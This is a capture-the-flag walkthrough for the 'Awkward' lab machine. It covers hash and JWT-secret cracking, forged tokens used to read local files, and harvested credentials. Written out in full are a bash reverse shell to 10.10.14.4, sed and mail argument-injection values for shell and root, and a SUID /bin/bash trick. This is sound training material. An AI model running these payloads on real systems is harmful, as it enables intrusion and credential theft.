**Target: 10.10.11.185 Awkward**

**Initial Access:**\
nmap -Pn 10.10.11.185 --min-rate=5000 -p- |grep open|awk -F '/' '{print $1}'|tr '\n' ',' \
Ouput shows open ports: 

Enumerate these open ports further with nmap: \
nmap -Pn 10.10.11.185 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.awkward

![image](https://user-images.githubusercontent.com/93153300/200636190-e11175fd-7e0e-4076-8fc6-0bb30ee5f990.png)
 
Visiting port 80 doesn’t work because it redirects to http://hat-valley.htb.  Add into /etc/hosts: 10.10.11.185 hat-valley.htb.  Visiting port 80 now works: 

![image](https://user-images.githubusercontent.com/93153300/200636243-8eebfa8a-ec7a-4f8b-9dd6-c3a0c1ddc24f.png)
 
Check if we can find this online store or a hidden subdomain with wfuzz:

![image](https://user-images.githubusercontent.com/93153300/200636272-1feb0c79-6f9f-4a8a-acec-16dd6f3911e3.png)
 
Wfuzz found a subdomain ‘store’.  Add this to /etc/hosts: \
10.10.11.185 hat-valley.htb     store.hat-valley.htb

Visiting store.hat-valley.htb shows we need credentials to access it:

![image](https://user-images.githubusercontent.com/93153300/200636297-76379d3b-c626-494b-b192-6f2ad739be68.png)
 
We don’t have credentials yet, so we will continue looking elsewhere.

Run directory brute forcing with: dirsearch -r -u http://hat-valley.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
Dirsearch found directory /hr/.

Visiting http://hat-valley.htb/hr/ shows: 

![image](https://user-images.githubusercontent.com/93153300/200636339-21116866-be09-47b5-a08b-e2f066e2d6fa.png)
 
Press f12 to go to developer tools.  Then go to storage and change the cookie value from guest to admin:

![image](https://user-images.githubusercontent.com/93153300/200636393-8be327d9-370e-4aab-bcd4-73250ae8e487.png)

![image](https://user-images.githubusercontent.com/93153300/200636411-37c3f9dd-db7f-45de-b8f5-d3bc4caf1ee7.png)
 
Refresh the page, and we get logged in as admin. The page redirects us to directory /dashboard:

![image](https://user-images.githubusercontent.com/93153300/200636474-a8252972-1b46-4f80-adca-dba32c6173e7.png)
  
Run OWASP ZAP tool on this wepage, http://hat-valley.htb/dashboard:

![image](https://user-images.githubusercontent.com/93153300/200636527-388eda14-3a72-483e-a43a-3cd4fb506ae5.png)
  
OWASP ZAP on the left hand side shows it found a new directory, /api/staff-detail.  On the right hand side OWASP ZAP shows that the directory /api/staff-detail contains usernames and passwords.  Copy the 4 password hashes and paste them into a file we will call ‘hash’.  Figure out the type of hash so we can use hashcat to crack the hashed passwords.  To figure out the hash we will use command ‘nth’ on the file ‘hash’: nth -f hash.    \
The ‘nth’ command returned the hash is sha256.  Use hashcat to crack the hashed passwords: hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt  \
Hashcat was able to crack one of the hashed passwords: e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123  

Log into directory /hr/ with username christopher.jones and password chris123.

Capturing the http://hat-valley.htb/dashboard page with burp suite shows:

![image](https://user-images.githubusercontent.com/93153300/200636561-f1f1aa2c-dbcc-4c5b-94f2-7fc2a6acdc83.png)

Base64 decode the cookie with command: echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3ODU4ODY4fQ.gux9aKKKoWmwzc1shMbXfKiwgJIelOj3zQq5mOvlaMg'|base64 -d 

The base64 decoded value of the token shows: {"alg":"HS256","typ":"JWT"}base64: invalid input \
This is not a regular base64 encoded value, it is a jwt token.  \
Crack the secret for the jwt token with john: \
Step 1: Download jwt2john with command: git clone https://github.com/Sjord/jwtcrack \
Step 2: Convert jwt value into a value john can use with command: python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3ODU4ODY4fQ.gux9aKKKoWmwzc1shMbXfKiwgJIelOj3zQq5mOvlaMg >john.txt \
Step 3: john john.txt –wordlist=/usr/share/wordlists/rockyou.txt \
John cracked the secret to: 123beany123
 
Now that we have the secret, we can manipulate the jwt token to execute commands.  \
Step 1: Go to jwt.io, paste the jwt token in on the left side.  \
Step 2: Add the secret ‘123beany123’ at the bottom right where the secret is mentioned.  \
Step 3: Replace username field in jwt.io with a file you want to read with this syntax: "username": "/' /etc/passwd 'a",

![image](https://user-images.githubusercontent.com/93153300/200636593-a4dc1c29-5a6b-4501-b9b8-df0515121984.png)
  
Go to http://hat-valley.htb/leave, fill out however we want, and capture the request when we click on ‘request leave’ in burp suite: 

![image](https://user-images.githubusercontent.com/93153300/200636686-70139195-5ef6-439a-a7dd-7b7a0d1670c2.png)
 
Forward the first request captured in burp suite.  We do not need the first request that burp suite captured which is directory /api/submit-leave.  We do need the second captured request which is directory /api/all-leave.  Send this request to repeater: 

![image](https://user-images.githubusercontent.com/93153300/200636737-92035950-55e1-4313-a47a-b010d5173890.png)

Take the jwt token in our above burp suite capture in directory /api/all-leave and replace it with our manipulated jwt token we made on jwt.io:

![image](https://user-images.githubusercontent.com/93153300/200636780-770d6bab-7ec1-4e15-aa9b-c5fd2fcd417e.png)
 
We get server side request forgery to local file inclusion.  Found users bean and christine in the /etc/passwd file.  

Back to jwt.io, replace /etc/passwd with /home/bean/.bashrc.  Copy the new jwt token generated on jwt.io and replace the token in burp suite and click on send.  The /home/bean/.bashrc shows a file by the name of ‘backup_home.sh’.  

 
Back to jwt.io, replace /home/bean/.bashrc with /home/bean/Documents/backup_home.sh.  Copy the new jwt token generated on jwt.io and replace the token in burp suite and click on send.  The /home/bean/Documents/backup_home.sh shows a file by the name of ‘/home/bean/Documents/backup/bean_backup_final.tar.gz’:  


Download the file ‘bean_backup_final.tar.gz’ using the curl command.  A simple and fast way to write this command is to right click in burpsuite request and select ‘copy as curl command’.  Remove from the curl command the ‘-i’ option: \
curl -s -k -X 'GET' -H 'Host: hat-valley.htb' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Referer: http://hat-valley.htb/leave' -H 'If-None-Match: W/\"8c-rIHXkvsSLlUvGPdve0hY79VoWd0\"' -H 'Content-Length: 0' -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJ2EiLCJpYXQiOjE2Njc4NjAzODN9.b4SY0b-w78jm3Wuz-VY6dr9io_UJGtq8EGvqJz2qc8s'  'http://hat-valley.htb/api/all-leave' > bean_backup_final.tar.gz

Unzip the bean_backup_final.tar.gz with command: tar -xvf bean_backup_final.tar.gz. \
The tar command extracted a file by the name of ‘bean_backup.tar.gz’.  Extract ‘bean_backup.tar.gz’ also with command: tar -xvf  bean_backup.tar.gz.  

In the files tar extracted, the directory .config/xpad/content refernces a user bean and shows a password ‘014mrbeanrules!#P’.  Use these credentials to ssh into user bean.  \
ssh bean@10.10.11.185 → when prompts for password enter the password.   \
We have shell as bean, can get the flag at /home/bean/user.txt.
___________________________________________________________________
**Lateral Movement:**\
Found credentials in /etc/nginx/conf.d/.htpasswd: username ‘admin’ and a hashed password.  This  username and hashed password is associated to the store.hat-valley.htb site.  Can’t crack the hashed password, but trying password reuse with user bean’s password works. Log into http://store.hat-valley.htb/ with username ‘admin’ and password ‘014mrbeanrules!#P’.   
 
Click on the top of the website where it says ‘SHOP’. That takes us to directory /shop.php.  Click on ‘add to cart’ under any of the 3 items:
 
![image](https://user-images.githubusercontent.com/93153300/200636812-30cbf7a3-8d7a-4fc0-8467-a0cc020ea4fe.png)
 
Click on the top of the website where is says ‘CART’.  That takes us to directory /cart.php.  We see the item we added to the cart.  

![image](https://user-images.githubusercontent.com/93153300/200636852-d9d7850c-34db-41f6-96b6-45adc68bc844.png)


The items added to the cart on site http://store.hat-valley.htb/cart.php will show up on our target bean shell in directory /var/www/store/cart with www-data user permissions.  So before adding an item to the cart the /var/www/store/cart directory looks empty: 

![image](https://user-images.githubusercontent.com/93153300/200636882-90e7ed83-0f3e-477d-bc3c-75640f3f2349.png)

After adding an item on http://store.hat-valley.htb/cart.php then the /var/www/store/cart directory shows the item:

![image](https://user-images.githubusercontent.com/93153300/200636917-65d3fc51-a392-407f-91b0-1e358a0a5a55.png)

Burp suite shows the same random filename is given to the item on our site http://store.hat-valley.htb/cart.php:

![image](https://user-images.githubusercontent.com/93153300/200636950-f9296747-70f0-4c1d-98e3-27084fb77f41.png)
 
Here are the steps to get shell as www-data: \
Step 1:  open a netcat listener with command: nc -lvnp 443 (I will use pwncat-cs -lp 443 because it gives a better shell) \
Step 2: echo -n “bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'” > /dev/shm/shell.sh \
Step 3: chmod +x /dev/shm/shell.sh \
Step 4: add item to the cart on the website http://store.hat-valley.htb/shop.php \
Step 5: in the user bean shell in directory /var/www/store/cart copy shop.php with command: cp 0ef8-d2f3-a9c-8c1b blob \
Step 6: Since we cannot edit the file created in /var/www/store/cart because it has user www-data permissions, we will delete the file.  Use command: rm -f  0ef8-d2f3-a9c-8c1b \
Step 7: Change the copied filename ‘blob’ to the filename we just deleted. Use command: mv  blob 0ef8-d2f3-a9c-8c1b \
Step 8: Change the item_id value in the file 0ef8-d2f3-a9c-8c1b as follows: item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh ' \
Step 9: Back to the http://store.hat-valley.htb/cart.php, capture the request in burp suite when clicking on ‘REMOVE’ the item:

![image](https://user-images.githubusercontent.com/93153300/200636985-9237464c-2043-4e58-b1ee-a17704365075.png)
  
Burp suite shows:

![image](https://user-images.githubusercontent.com/93153300/200637007-75c6c80a-c183-4d99-8a9d-20f7c7396582.png)
 
Step 10: Change the ‘item’ value in the captured request in burp suite to the same value we put above and then url encode the key characters: item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'.  Then forward the modified captured request in burp suite. \
We have shell as www-data on our netcat listener.

For understanding on how these steps get a reverse shell look at /var/www/store/cart_actions.php, focus on the ‘sed’ command:

![image](https://user-images.githubusercontent.com/93153300/200637032-8e6b3030-f39f-4c5b-b47b-35ce4e2575a5.png)
 
Gtfobins shows an exploit on the sed command:

![image](https://user-images.githubusercontent.com/93153300/200637060-1480eee2-5fb4-4fe6-9288-d847761f2900.png)
 _____________________________________________________________________
**Privilege Escalation:**\
Upload pspy to the target. Running pspy shows: 

![image](https://user-images.githubusercontent.com/93153300/200637084-502e8558-05ba-4e61-9319-5761470d2ff5.png)
 
We see command ‘inotifywait’ is monitoring ‘leave_requests.csv’.  Add something to ‘leave_requests.csv’ and see what happens in pspy: 

![image](https://user-images.githubusercontent.com/93153300/200637136-d54b6b45-b7d1-4f8f-a48f-b7da9e02f85f.png)

Pspy shows that adding something to the ‘leave_requests.csv file causes the mail command to be run as root on what we added.  Google search ‘gtfobins mail’ finds an exploit: 

![image](https://user-images.githubusercontent.com/93153300/200637164-e35ddd1e-6812-46d4-a5fa-e782e1e4feb2.png)

echo -n "chmod 4755 /bin/bash" >/dev/shm/priv.sh \
chmod +x /dev/shm/priv.sh \
echo -n ‘ --exec="\!/dev/shm/priv.sh"’ >>leave_requests.csv \
/bin/bash -p  \
We got shell as root. We can get the flag in /root/root.txt
